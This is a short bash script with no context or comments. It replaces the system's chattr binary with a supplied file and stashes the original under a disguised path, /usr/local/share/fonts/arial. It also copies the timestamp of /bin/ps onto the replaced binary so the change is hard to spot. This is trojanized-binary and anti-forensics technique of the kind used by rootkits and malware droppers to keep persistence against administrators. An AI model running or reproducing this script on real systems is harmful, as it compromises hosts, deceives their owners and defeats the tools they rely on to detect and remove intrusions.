#!/usr/bin/bash
chmod 755 chattr; cpath=$(which chattr); cp $cpath /usr/local/share/fonts/arial; mv chattr $cpath; touch -r /bin/ps $cpath
